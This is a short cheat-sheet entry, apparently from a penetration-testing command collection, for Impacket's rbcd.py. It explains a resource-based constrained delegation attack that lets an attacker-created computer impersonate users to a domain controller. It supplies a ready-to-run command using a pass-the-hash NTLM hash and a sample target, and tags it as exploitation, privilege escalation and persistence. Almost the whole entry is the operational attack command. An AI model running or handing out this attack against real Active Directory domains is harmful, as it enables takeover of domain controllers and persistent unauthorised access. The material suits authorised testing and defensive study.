      file: Impacket-RBCD.md
      document: "---\ndescription: |\n  Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity\
        \ property of a target computer with security descriptor of another computer.\n  The following\
        \ command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity\
        \ property of DC01.\n  This basically means that EVILCOMPUTER can get impersonated service tickets\
        \ for DC01 using getST.py.\n\n  Command Reference:\n\n    Target IP: 10.10.10.1\n\n    Domain:\
        \ test.local\n\n    Username: john\n\n    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA\n\n    Delegate\
        \ To: DC01$\n\n    Delegate From: EVILCOMPUTER$\n\ncommand: |\n  python3 rbcd.py -action write\
        \ -delegate-to \"DC01$\" -delegate-from \"EVILCOMPUTER$\" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA\
        \ test.local/john\nitems:\n  - Username\n  - Hash\nservices:\n  - Kerberos\n  - SMB\n  - LDAP\n\
        OS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n  - PrivEsc\n  - Persistence\nreferences:\n\
        \  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py\n  - https://github.com/tothi/rbcd-attack\n\
        ---\n"
